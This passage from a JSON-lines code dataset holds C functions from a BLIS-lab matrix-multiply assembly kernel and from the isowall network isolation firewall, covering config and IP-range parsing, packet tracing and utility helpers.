                                          \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DCOLSTORBZ:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd          %%ymm4,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd          %%ymm5,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd          %%ymm6,  (%%r12)           \\n\\t\"\n\t\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd          %%ymm7,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd          %%ymm8,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd          %%ymm9,  (%%r12)           \\n\\t\"\n\t\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd          %%ymm10, (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd          %%ymm11, (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd          %%ymm12, (%%r12)           \\n\\t\"\n\t\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovapd          %%ymm13, (%%rcx)           \\n\\t\"\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovapd          %%ymm14, (%%rdx)           \\n\\t\"\n\t//\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"vmovapd          %%ymm15, (%%r12)           \\n\\t\"\n\t//\"addq      %%rdi, %%r12                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DDONE:                                     \\n\\t\"\n\t\"                                            \\n\\t\"\n\n\t: // output operands (none)\n\t: // input operands\n\t  \"m\" (k_iter), // 0\n\t  \"m\" (k_left), // 1\n\t  \"m\" (a),      // 2\n\t  \"m\" (b),      // 3\n\t  \"m\" (alpha),  // 4\n\t  \"m\" (beta),   // 5\n\t  \"m\" (c),      // 6\n\t  \"m\" (rs_c),   // 7\n\t  \"m\" (cs_c)/*,   // 8\n\t  \"m\" (b_next), // 9\n\t  \"m\" (a_next)*/  // 10\n\t: // register clobber list\n\t  \"rax\", \"rbx\", \"rcx\", \"rdx\", \"rsi\", \"rdi\", \n\t  \"r8\", \"r9\", \"r10\", \"r11\", \"r12\", \"r13\", \"r14\", \"r15\",\n\t  \"xmm0\", \"xmm1\", \"xmm2\", \"xmm3\",\n\t  \"xmm4\", \"xmm5\", \"xmm6\", \"xmm7\",\n\t  \"xmm8\", \"xmm9\", \"xmm10\", \"xmm11\",\n\t  \"xmm12\", \"xmm13\", \"xmm14\", \"xmm15\",\n\t  \"memory\"\n\t);\n}", "path": "step4\\kernels\\bl_dgemm_asm_12x4.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// Code for work assignments\n", "func_signal": "void bl_get_range( int n, int bf, int* start, int* end )", "code": "{\n\t//int      n_way      = thread->n_way;\n\t//int      work_id    = thread->work_id;\n    int      n_way      = omp_get_num_threads();\n    int      work_id    = omp_get_thread_num();\n\n\n    //printf( \"n: %d, bf: %d, start: %d, end: %d, n_way: %d, work_id: %d\\n,\", n, bf, *start, *end, n_way, work_id );\n\n\tint      all_start  = 0;\n\tint      all_end    = n;\n\n\tint      size       = all_end - all_start;\n\n\tint      n_bf_whole = size / bf;\n\tint      n_bf_left  = size % bf;\n\n\tint      n_bf_lo    = n_bf_whole / n_way;\n\tint      n_bf_hi    = n_bf_whole / n_way;\n\n\t// In this function, we partition the space between all_start and\n\t// all_end into n_way partitions, each a multiple of block_factor\n\t// with the exception of the one partition that recieves the\n\t// \"edge\" case (if applicable).\n\t//\n\t// Here are examples of various thread partitionings, in units of\n\t// the block_factor, when n_way = 4. (A '+' indicates the thread\n\t// that receives the leftover edge case (ie: n_bf_left extra\n\t// rows/columns in its sub-range).\n\t//                                        (all_start ... all_end)\n\t// n_bf_whole  _left  hel  n_th_lo  _hi   thr0  thr1  thr2  thr3\n\t//         12     =0    f        0    4      3     3     3     3\n\t//         12     >0    f        0    4      3     3     3     3+\n\t//         13     >0    f        1    3      4     3     3     3+\n\t//         14     >0    f        2    2      4     4     3     3+\n\t//         15     >0    f        3    1      4     4     4     3+\n\t//         15     =0    f        3    1      4     4     4     3 \n\t//\n\t//         12     =0    t        4    0      3     3     3     3\n\t//         12     >0    t        4    0      3+    3     3     3\n\t//         13     >0    t        3    1      3+    3     3     4\n\t//         14     >0    t        2    2      3+    3     4     4\n\t//         15     >0    t        1    3      3+    4     4     4\n\t//         15     =0    t        1    3      3     4     4     4\n\n\t// As indicated by the table above, load is balanced as equally\n\t// as possible, even in the presence of an edge case.\n\n\t// First, we must differentiate between cases where the leftover\n\t// \"edge\" case (n_bf_left) should be allocated to a thread partition\n\t// at the low end of the index range or the high end.\n\n\t\t// Notice that if all threads receive the same number of\n\t\t// block_factors, those threads are considered \"high\" and\n\t\t// the \"low\" thread group is empty.\n\t\tint n_th_lo = n_bf_whole % n_way;\n\t\t//int n_th_hi = n_way - n_th_lo;\n\n\t\t// If some partitions must have more block_factors than others\n\t\t// assign the slightly larger partitions to lower index threads.\n\t\tif ( n_th_lo != 0 ) n_bf_lo += 1;\n\n\t\t// Compute the actual widths (in units of rows/columns) of\n\t\t// individual threads in the low and high groups.\n\t\tint size_lo = n_bf_lo * bf;\n\t\tint size_hi = n_bf_hi * bf;\n\n\t\t// Precompute the starting indices of the low and high groups.\n\t\tint lo_start = all_start;\n\t\tint hi_start = all_start + n_th_lo * size_lo;\n\n\t\t// Compute the start and end of individual threads' ranges\n\t\t// as a function of their work_ids and also the group to which\n\t\t// they belong (low or high).\n\t\tif ( work_id < n_th_lo )\n\t\t{\n\t\t\t*start = lo_start + (work_id  ) * size_lo;\n\t\t\t*end   = lo_start + (work_id+1) * size_lo;\n\t\t}\n\t\telse // if ( n_th_lo <= work_id )\n\t\t{\n\t\t\t*start = hi_start + (work_id-n_th_lo  ) * size_hi;\n\t\t\t*end   = hi_start + (work_id-n_th_lo+1) * size_hi;\n\n\t\t\t// Since the edge case is being allocated to the high\n\t\t\t// end of the index range, we have to advance the last\n\t\t\t// thread's end.\n\t\t\tif ( work_id == n_way - 1 ) *end += n_bf_left;\n\t\t}\n\t\n}", "path": "step4\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Linux build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    double the_time, norm_sec;\n    struct timespec ts;\n\n    clock_gettime( CLOCK_MONOTONIC, &ts );\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = ( double ) ts.tv_sec;\n\n    norm_sec = ( double ) ts.tv_sec - gtod_ref_time_sec;\n\n    the_time = norm_sec + ts.tv_nsec * 1.0e-9;\n\n    return the_time;\n}", "path": "common\\dgemm\\bl_dgemm_util_mt.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "/***************************************************************************\n ***************************************************************************/\n", "func_signal": "int\nmainconf_selftest()", "code": "{\n    char test[] = \" test 1 \";\n    \n    trim(test, sizeof(test));\n    if (strcmp(test, \"test 1\") != 0)\n        return 1; /* failure */\n \n    {\n        struct Range range;\n        \n        range.begin = 16;\n        range.end = 32-1;\n        if (count_cidr_bits(range) != 28)\n            return 1;\n\n        range.begin = 1;\n        range.end = 13;\n        if (count_cidr_bits(range) != 0)\n            return 1;\n\n\n    }\n\n    return 0;\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/*****************************************************************************\n * Read in ranges from a file\n *\n * There can be multiple ranges on a line, delimited by spaces. In fact,\n * millions of ranges can be on a line: there is limit to the line length.\n * That makes reading the file a little bit squirrelly. From one perspective\n * this parser doesn't treat the the new-line '\\n' any different than other\n * space. But, from another perspective, it has to, because things like\n * comments are terminated by a newline. Also, it has to count the number\n * of lines correctly to print error messages.\n *****************************************************************************/\n", "func_signal": "static void\nranges_from_file(struct RangeList *ranges, const char *filename)", "code": "{\n    FILE *fp;\n    errno_t err;\n    unsigned line_number = 0;\n\n\n    err = fopen_s(&fp, filename, \"rt\");\n    if (err) {\n        perror(filename);\n        my_exit(1); /* HARD EXIT: because if it's an exclusion file, we don't\n                  * want to continue. We don't want ANY chance of\n                  * accidentally scanning somebody */\n    }\n\n    while (!feof(fp)) {\n        int c = '\\n';\n\n        /* remove leading whitespace */\n        while (!feof(fp)) {\n            c = getc(fp);\n            line_number += (c == '\\n');\n            if (!isspace(c&0xFF))\n                break;\n        }\n\n        /* If this is a punctuation, like '#', then it's a comment */\n        if (ispunct(c&0xFF)) {\n            while (!feof(fp)) {\n                c = getc(fp);\n                line_number += (c == '\\n');\n                if (c == '\\n') {\n                    break;\n                }\n            }\n            /* Loop back to the begining state at the start of a line */\n            continue;\n        }\n\n        if (c == '\\n') {\n            continue;\n        }\n\n        /*\n         * Read in a single entry\n         */\n        if (!feof(fp)) {\n            char address[64];\n            size_t i;\n            struct Range range;\n            unsigned offset = 0;\n\n\n            /* Grab all bytes until the next space or comma */\n            address[0] = (char)c;\n            i = 1;\n            while (!feof(fp)) {\n                c = getc(fp);\n                line_number += (c == '\\n');\n                if (isspace(c&0xFF) || c == ',') {\n                    break;\n                }\n                if (i+1 >= sizeof(address)) {\n                    LOG(0, \"%s:%u:%u: bad address spec: \\\"%.*s\\\"\\n\",\n                            filename, line_number, offset, i, address);\n                    my_exit(1);\n                } else\n                    address[i] = (char)c;\n                i++;\n            }\n            address[i] = '\\0';\n\n            /* parse the address range */\n            range = range_parse_ipv4(address, &offset, (unsigned)i);\n            if (range.begin == 0xFFFFFFFF && range.end == 0) {\n                LOG(0, \"%s:%u:%u: bad range spec: \\\"%.*s\\\"\\n\", \n                        filename, line_number, offset, i, address);\n                my_exit(1);\n            } else {\n                rangelist_add_range(ranges, range.begin, range.end);\n            }\n        }\n\n    }\n\n    fclose(fp);\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/****************************************************************************\n ****************************************************************************/\n", "func_signal": "static void\nisowall_echo(const struct IsoWall *isowall, FILE *fp)", "code": "{\n    echo_nics(isowall, fp);\n\n    fprintf(fp, \"\\n\");\n\n    echo_ranges(&isowall->allow, fp, \"allow\");\n    echo_ranges(&isowall->block, fp, \"block\");\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n * Print packet info, when using nmap-style --packet-trace option\n ***************************************************************************/\n", "func_signal": "void\npacket_trace(FILE *fp, double pt_start, const unsigned char *px, size_t length, unsigned is_sent)", "code": "{\n    unsigned x;\n    struct PreprocessedInfo parsed;\n    unsigned src_ip;\n    unsigned dst_ip;\n    char from[32];\n    char to[32];\n    char sz_type[32];\n    unsigned type;\n    double timestamp = 1.0 * time(0);\n    unsigned offset;\n    const char *direction;\n    \n    if (is_sent)\n        direction = \"SENT\";\n    else\n        direction = \"RCVD\";\n\n    /* parse the packet */\n    x = preprocess_frame(px, (unsigned)length, 1, &parsed);\n    if (!x)\n        return;\n    offset = parsed.found_offset;\n    \n    src_ip = parsed.ip_src[0] << 24\n        | parsed.ip_src[1] << 16\n        | parsed.ip_src[2] << 8\n        | parsed.ip_src[3];\n    dst_ip = parsed.ip_dst[0] << 24\n        | parsed.ip_dst[1] << 16\n        | parsed.ip_dst[2] << 8\n        | parsed.ip_dst[3];\n\n    /* format the IP addresses into fixed-width fields */\n    sprintf_s(from, sizeof(from), \"%u.%u.%u.%u:%u\",\n              (src_ip>>24)&0xFF, (src_ip>>16)&0xFF,\n              (src_ip>>8)&0xFF, (src_ip>>0)&0xFF,\n              parsed.port_src);\n    \n    sprintf_s(to, sizeof(to), \"%u.%u.%u.%u:%u\",\n              (dst_ip>>24)&0xFF, (dst_ip>>16)&0xFF,\n              (dst_ip>>8)&0xFF, (dst_ip>>0)&0xFF,\n              parsed.port_dst);\n    \n    switch (parsed.found) {\n        case FOUND_ARP:\n            type = px[offset+6]<<8 | px[offset+7];\n\t\t\t*strchr(to, ':') = '\\0';\n\t\t\t*strchr(from, ':') = '\\0';\n            switch (type) {\n                case 1:strcpy_s(sz_type, sizeof(sz_type), \"request\"); break;\n                case 2:strcpy_s(sz_type, sizeof(sz_type), \"response\"); break;\n                default: sprintf_s(sz_type, sizeof(sz_type), \"unknown(%u)\", type); break;\n            }\n            fprintf(fp, \"%s (%5.4f) ARP  %-21s > %-21s %s\\n\", direction,\n                    timestamp - pt_start, from, to, sz_type);\n            break;\n        case FOUND_DNS:\n        case FOUND_UDP:\n            fprintf(fp, \"%s (%5.4f) UDP  %-21s > %-21s \\n\", direction,\n                    timestamp - pt_start, from, to);\n            break;\n        case FOUND_ICMP:\n            fprintf(fp, \"%s (%5.4f) ICMP %-21s > %-21s \\n\", direction,\n                    timestamp - pt_start, from, to);\n            break;\n        case FOUND_TCP:\n            type = px[offset+13];\n            switch (type) {\n                case 0x00: strcpy_s(sz_type, sizeof(sz_type), \"NULL\"); break;\n                case 0x01: strcpy_s(sz_type, sizeof(sz_type), \"FIN\"); break;\n                case 0x11: strcpy_s(sz_type, sizeof(sz_type), \"FIN-ACK\"); break;\n                case 0x19: strcpy_s(sz_type, sizeof(sz_type), \"FIN-ACK-PSH\"); break;\n                case 0x02: strcpy_s(sz_type, sizeof(sz_type), \"SYN\"); break;\n                case 0x12: strcpy_s(sz_type, sizeof(sz_type), \"SYN-ACK\"); break;\n                case 0x04: strcpy_s(sz_type, sizeof(sz_type), \"RST\"); break;\n                case 0x14: strcpy_s(sz_type, sizeof(sz_type), \"RST-ACK\"); break;\n                case 0x15: strcpy_s(sz_type, sizeof(sz_type), \"RST-FIN-ACK\"); break;\n                case 0x10: strcpy_s(sz_type, sizeof(sz_type), \"ACK\"); break;\n                case 0x18: strcpy_s(sz_type, sizeof(sz_type), \"ACK-PSH\"); break;\n                default:\n                    sprintf_s(sz_type, sizeof(sz_type),\n                              \"%s%s%s%s%s%s%s%s\",\n                              (type&0x01)?\"FIN\":\"\",\n                              (type&0x02)?\"SYN\":\"\",\n                              (type&0x04)?\"RST\":\"\",\n                              (type&0x08)?\"PSH\":\"\",\n                              (type&0x10)?\"ACK\":\"\",\n                              (type&0x20)?\"URG\":\"\",\n                              (type&0x40)?\"ECE\":\"\",\n                              (type&0x80)?\"CWR\":\"\"\n                              );\n                    break;\n            }\n            if (parsed.app_length)\n            fprintf(fp, \"%s (%5.4f) TCP  %-21s > %-21s %s %u-bytes\\n\", direction,\n                    timestamp - pt_start, from, to, sz_type, parsed.app_length);\n            else\n            fprintf(fp, \"%s (%5.4f) TCP  %-21s > %-21s %s\\n\", direction,\n                    timestamp - pt_start, from, to, sz_type);\n            break;\n        case FOUND_IPV6:\n            break;\n        default:\n            fprintf(fp, \"%s (%5.4f) UNK  %-21s > %-21s [%u]\\n\", direction, \n                    timestamp - pt_start, from, to, parsed.found);\n            break;\n    }\n\n\n}", "path": "src\\main-ptrace.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n ***************************************************************************/\n", "func_signal": "static void\nparse_ranges(struct RangeList *list, const char *value)", "code": "{\n    unsigned offset = 0;\n    unsigned max_offset = (unsigned)strlen(value);\n\n    /* multiple ranges can be specified on a line */\n    for (;;) {\n        struct Range range;\n\n        /* parse the range */\n        range = range_parse_ipv4(value, &offset, max_offset);\n        if (range.end < range.begin) {\n            fprintf(stderr, \"FAIL: bad IP address/range: %s\\n\", value);\n            my_exit(1);\n        }\n\n        /* add to our allow/block list */\n        rangelist_add_range(list, range.begin, range.end);\n\n        if (offset >= max_offset || value[offset] != ',')\n            break;\n        else\n            offset++; /* skip comma */\n    }\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n ***************************************************************************/\n", "func_signal": "static void\nadapter_set_parameter(struct Adapter *adapter,\n                      const char *name, const char *value)", "code": "{\n    if (EQUALS(\"name\", name) || EQUALS(\"ifname\", name) || name[0] == '\\0') {\n        /*\n         * The 'name' of the adapter, like \"eth1\"\n         */\n        size_t len = strlen(value) + 1;\n        if (adapter->ifname != 0 && adapter->ifname[0] != 0) {\n            LOG(0, \"WARNING: overwriting adapter name, from '%s' to '%s'\\n\",\n                adapter->ifname, value);\n        }\n        if (adapter->ifname)\n            free(adapter->ifname);\n        adapter->ifname = (char*)malloc(len);\n        if (adapter->ifname)\n            strcpy_s(adapter->ifname, len, value);\n    } else if (EQUALS(\"target-ip\", name) || EQUALS(\"ip\", name) \n                || EQUALS(\"router-ip\", name)) {\n        struct Range range;\n\n        range = range_parse_ipv4(value, 0, 0);\n\n        /* Check for bad format */\n        if (range.begin != range.end) {\n            LOG(0, \"FAIL: bad IPv4 address: %s=%s\\n\", \n                    name, value);\n            LOG(0, \"hint   addresses look like \\\"19.168.1.23\\\"\\n\");\n            my_exit(1);\n        }\n\n        adapter->target_ip = range.begin;\n    } else if (EQUALS(\"target-mac\", name) || EQUALS(\"router-mac\", name)) {\n        unsigned char mac[6];\n\n        if (parse_mac_address(value, mac) != 0) {\n            fprintf(stderr, \"FAIL: bad MAC address: %s=%s\\n\", name, value);\n            my_exit(1);\n            return;\n        }\n\n        memcpy(adapter->target_mac, mac, 6);\n    } else if (EQUALS(\"my-mac\", name) || EQUALS(\"me\", name)) {\n        unsigned char mac[6];\n\n        if (parse_mac_address(value, mac) != 0) {\n            fprintf(stderr, \"FAIL: bad MAC address: %s=%s\\n\", name, value);\n            my_exit(1);\n            return;\n        }\n\n        memcpy(adapter->my_mac, mac, 6);\n    } else if (EQUALS(\"bpf\", name)) {\n        size_t len = strlen(value) + 1;\n        if (adapter->bpf_filter) {\n            LOG(0, \"WARNING: overwriting BPF filter\\n\");\n            free(adapter->bpf_filter);\n        }\n        adapter->bpf_filter = (char*)malloc(len);\n        if (adapter->bpf_filter)\n            memcpy(adapter->bpf_filter, value, len);\n    } else {\n        LOG(0, \"unknown adapter configuration parameter: %s=%s\\n\", \n            name, value);\n        my_exit(1);\n    }\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n ***************************************************************************/\n", "func_signal": "static int\nparse_mac_address(const char *text, unsigned char *mac)", "code": "{\n    unsigned i;\n\n    for (i=0; i<6; i++) {\n        unsigned x;\n        char c;\n\n        while (isspace(*text & 0xFF) && ispunct(*text & 0xFF))\n            text++;\n\n        c = *text;\n        if (!isxdigit(c&0xFF))\n            return -1;\n        x = hexval(c)<<4;\n        text++;\n\n        c = *text;\n        if (!isxdigit(c&0xFF))\n            return -1;\n        x |= hexval(c);\n        text++;\n\n        mac[i] = (unsigned char)x;\n\n        if (ispunct(*text & 0xFF))\n            text++;\n    }\n\n    return 0;\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/****************************************************************************\n ****************************************************************************/\n", "func_signal": "static void\necho_ranges(const struct RangeList *ranges, FILE *fp, const char *name)", "code": "{\n    unsigned i;\n\n    for (i=0; i<ranges->count; i++) {\n        struct Range range = ranges->list[i];\n        fprintf(fp, \"%s = \", name);\n        fprintf(fp, \"%u.%u.%u.%u\",\n            (range.begin>>24)&0xFF,\n            (range.begin>>16)&0xFF,\n            (range.begin>> 8)&0xFF,\n            (range.begin>> 0)&0xFF\n            );\n        if (range.begin != range.end) {\n            unsigned cidr_bits = count_cidr_bits(range);\n\n            if (cidr_bits) {\n                fprintf(fp, \"/%u\", cidr_bits);\n            } else {\n                fprintf(fp, \"-%u.%u.%u.%u\",\n                    (range.end>>24)&0xFF,\n                    (range.end>>16)&0xFF,\n                    (range.end>> 8)&0xFF,\n                    (range.end>> 0)&0xFF\n                    );\n            }\n        }\n        fprintf(fp, \"\\n\");\n    }\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n * remove leading/trailing whitespace\n ***************************************************************************/\n", "func_signal": "static void\ntrim(char *line, size_t sizeof_line)", "code": "{\n    if (sizeof_line > strlen(line))\n        sizeof_line = strlen(line);\n    \n    while (isspace(*line & 0xFF))\n        memmove(line, line+1, sizeof_line--);\n    while (isspace(line[sizeof_line-1] & 0xFF))\n        line[--sizeof_line] = '\\0';\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/*****************************************************************************\n *****************************************************************************/\n", "func_signal": "static void\nisowall_help(void)", "code": "{\n    printf(\"\");\n    my_exit(1);\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n * This checks whether the \"pf_ring\" driver is installed.\n ***************************************************************************/\n", "func_signal": "int\nPFRING_is_installed(void)", "code": "{\n#if defined(__linux__)\n    FILE *fp;\n    int err;\n    char line[256];\n    int found = 0;\n\n    err = fopen_s(&fp, \"/proc/modules\", \"rb\");\n    if (err)\n        return 0;\n\n    while (fgets(line, sizeof(line), fp)) {\n        if (memcmp(line, \"pf_ring \", 8) == 0) {\n            found = 1;\n            LOG(2, \"pfring: found 'pf_ring' driver\\n\");\n        }\n        if (memcmp(line, \"ixgbe \", 6) == 0) {\n            LOG(2, \"pfring: found 'ixgbe' driver\\n\");\n        }\n        if (memcmp(line, \"e1000e \", 8) == 0) {\n            LOG(2, \"pfring: found 'e1000e' driver\\n\");\n        }\n    }\n    fclose(fp);\n    return found;\n#else\n    return 0;\n#endif\n}", "path": "src\\rawsock-pfring.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/****************************************************************************\n ****************************************************************************/\n", "func_signal": "static unsigned\ncount_cidr_bits(struct Range range)", "code": "{\n    unsigned i;\n\n    for (i=0; i<32; i++) {\n        unsigned mask = 0xFFFFFFFF >> i;\n\n        if ((range.begin & ~mask) == (range.end & ~mask)) {\n            if ((range.begin & mask) == 0 && (range.end & mask) == mask)\n                return i;\n        }\n    }\n\n    return 0;\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n * Read the configuration from the command-line.\n * Called by 'main()' when starting up.\n ***************************************************************************/\n", "func_signal": "void\nisowall_command_line(struct IsoWall *isowall, int argc, char *argv[])", "code": "{\n    int i;\n\n    for (i=1; i<argc; i++) {\n\n        /*\n         * --name=value\n         * --name:value\n         * -- name value\n         */\n        if (argv[i][0] == '-' && argv[i][1] == '-') {\n            char name2[64];\n            char *name = argv[i] + 2;\n            unsigned name_length;\n            const char *value;\n            int increment = 0;\n\n            value = strchr(&argv[i][2], '=');\n            if (value == NULL)\n                value = strchr(&argv[i][2], ':');\n            if (value == NULL) {\n                if (i+1 < argc)\n                    value = argv[i+1];\n                else\n                    value = \"\";\n                name_length = (unsigned)strlen(name);\n            } else {\n                name_length = (unsigned)(value - name);\n                value++;\n            }\n\n\n            if (name_length > sizeof(name2) - 1) {\n                fprintf(stderr, \"%.*s: name too long\\n\", name_length, name);\n                name_length = sizeof(name2) - 1;\n            }\n\n            memcpy(name2, name, name_length);\n            name2[name_length] = '\\0';\n\n            increment = isowall_set_parameter(isowall, name2, value);\n\n            i += increment;\n\n            if (i >= argc) {\n                fprintf(stderr, \"%.*s: empty parameter\\n\", name_length, name);\n                break;\n            }\n            continue;\n        }\n\n        /* For for a single-dash parameter */\n        if (argv[i][0] == '-') {\n            const char *arg;\n\n            switch (argv[i][1]) {\n            case 'c':\n                if (argv[i][2])\n                    arg = argv[i]+2;\n                else\n                    arg = argv[++i];\n                isowall_read_config_file(isowall, arg);\n                break;\n            case 'd': /* just do same as verbosity level */\n                {\n                    int v;\n                    for (v=1; argv[i][v] == 'd'; v++) {\n                        LOG_add_level(1);\n\t\t\t\t\t}\n                }\n                break;\n            case 'h':\n            case '?':\n                isowall_usage();\n                break;\n            case 'v':\n                {\n                    int v;\n                    for (v=1; argv[i][v] == 'v'; v++)\n                        LOG_add_level(1);\n                }\n                break;\n            case 'W':\n                isowall->op = Operation_List_Adapters;\n                return;\n            default:\n                LOG(0, \"FAIL: unknown option: -%s\\n\", argv[i]);\n                LOG(0, \" [hint] try \\\"--help\\\"\\n\");\n                my_exit(1);\n            }\n            continue;\n        }\n\n        fprintf(stderr, \"FAIL: unknown command-line parameter \\\"%s\\\"\\n\", argv[i]);\n        fprintf(stderr, \" [hint] did you want \\\"--%s\\\"?\\n\", argv[i]);\n        my_exit(1);\n    }\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/****************************************************************************\n ****************************************************************************/\n", "func_signal": "void\nisowall_usage(void)", "code": "{\n    LOG(0, \"usage:\\n see https://github.com/robertdavidgraham/isowall\\n\");\n    my_exit(1);\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/*\n * I don't understand why Microsoft says this function is unsafe, so\n * do it anyway\n */\n", "func_signal": "const char *strerror_x(int x)", "code": "{\n#ifdef _MSC_VER\n#pragma warning(disable: 4996)\n#endif\n#undef strerror\n    return strerror(x);\n}", "path": "src\\string_s.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n * Tests if the named parameter on the command-line. We do a little\n * more than a straight string compare, because I get confused \n * whether parameter have punctuation. Is it \"--excludefile\" or\n * \"--exclude-file\"? I don't know if it's got that dash. Screw it,\n * I'll just make the code so it don't care.\n ***************************************************************************/\n", "func_signal": "static int\nEQUALS(const char *lhs, const char *rhs)", "code": "{\n    for (;;) {\n        while (*lhs == '-' || *lhs == '.' || *lhs == '_')\n            lhs++;\n        while (*rhs == '-' || *rhs == '.' || *rhs == '_')\n            rhs++;\n        if (*lhs == '\\0' && *rhs == '[')\n            return 1; /*arrays*/\n        if (tolower(*lhs & 0xFF) != tolower(*rhs & 0xFF))\n            return 0;\n        if (*lhs == '\\0')\n            return 1;\n        lhs++;\n        rhs++;\n    }\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n ***************************************************************************/\n", "func_signal": "void\nisowall_read_config_file(struct IsoWall *isowall, const char *filename)", "code": "{\n    FILE *fp;\n    errno_t err;\n    char line[65536];\n\n    err = fopen_s(&fp, filename, \"rt\");\n    if (err) {\n        perror(filename);\n        return;\n    }\n\n    while (fgets(line, sizeof(line), fp)) {\n        char *name;\n        char *value;\n\n        trim(line, sizeof(line));\n\n        if (ispunct(line[0] & 0xFF) || line[0] == '\\0')\n            continue;\n\n        name = line;\n        value = strchr(line, '=');\n        if (value == NULL)\n            continue;\n        *value = '\\0';\n        value++;\n        trim(name, sizeof(line));\n        trim(value, sizeof(line));\n\n        isowall_set_parameter(isowall, name, value);\n    }\n\n    fclose(fp);\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n * Called either from the \"command-line\" parser when it sees a --parm,\n * or from the \"config-file\" parser for normal options.\n ***************************************************************************/\n", "func_signal": "static int\nisowall_set_parameter(struct IsoWall *isowall, \n                      const char *name, const char *value)", "code": "{\n    if (memcmp(\"in\", name, 2) == 0) {\n        while (*name && *name != '.' && *name != '-')\n            name++;\n        while (ispunct(name[0]&0xFF))\n            name++;\n        adapter_set_parameter(&isowall->in, name, value);\n    } else if (memcmp(\"ex\", name, 2) == 0) {\n        while (*name && *name != '.' && *name != '-')\n            name++;\n        while (ispunct(name[0]&0xFF))\n            name++;\n        adapter_set_parameter(&isowall->ex, name, value);\n    } else if (EQUALS(\"conf\", name) || EQUALS(\"config\", name)) {\n        isowall_read_config_file(isowall, value);\n    } else if (EQUALS(\"allow\", name) || EQUALS(\"whitelist\", name)\n                || EQUALS(\"accept\", name)) {\n        parse_ranges(&isowall->allow, value);\n    } else if (EQUALS(\"block\", name) || EQUALS(\"blacklist\", name)\n                || EQUALS(\"deny\", name) || EQUALS(\"drop\", name)) {\n        parse_ranges(&isowall->block, value);\n    } else if (EQUALS(\"debug\", name)) {\n        if (EQUALS(\"if\", value)) {\n            isowall->op = Operation_DebugIF;\n        } else {\n            LOG(0, \"unknown debug function: %s\\n\", value);\n            my_exit(1);\n        }\n    } else if (EQUALS(\"echo\", name)) {\n        isowall_echo(isowall, stdout);\n        my_exit(1);\n    } else if (EQUALS(\"help\", name)) {\n        isowall_help();\n        my_exit(1);\n    } else if (EQUALS(\"excludefile\", name) || 